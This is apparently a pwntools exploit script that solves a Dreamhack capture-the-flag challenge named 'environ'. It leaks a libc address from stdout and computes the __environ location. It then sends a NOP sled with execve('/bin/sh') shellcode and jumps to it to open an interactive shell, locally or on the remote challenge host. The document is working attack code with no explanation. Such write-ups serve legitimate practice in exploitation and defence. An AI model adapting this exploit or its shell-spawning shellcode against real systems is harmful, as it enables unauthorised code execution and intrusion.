#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./environ_patched', checksec=False)
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

gs = """
b *main
b *main+163
b *main+188
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)


def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 13707)
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})
def stdout_leak():
    io.recvuntil(b'stdout: ')
    return int(io.recvn(14), 16)

def send_size(size):
    sla(b'Size: ', str(size).encode())

def send_data(data):
    sla(b'Data: ', data)

def send_fmp(value):
    sla(b'*jmp=', str(value).encode())

io = start()

stdout = stdout_leak()
libc.address = stdout - libc.sym['_IO_2_1_stdout_']
environ = libc.sym['__environ']

success(f"stdout @ {hex(stdout)}")
success(f'libc @ {hex(libc.address)}')
success(f"environ @ {hex(environ)}")

nop_sled = b'\x90' * 0x118
shellcode = asm(
    '''
    lea rdi, [rip +binsh]
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    mov al, 0x3b
    syscall
    binsh:
        .asciz "/bin/sh"
    ''', arch = 'amd64', os = 'linux')

payload = nop_sled + shellcode
send_size(len(payload))
send_data(payload)
send_fmp(environ)


io.interactive()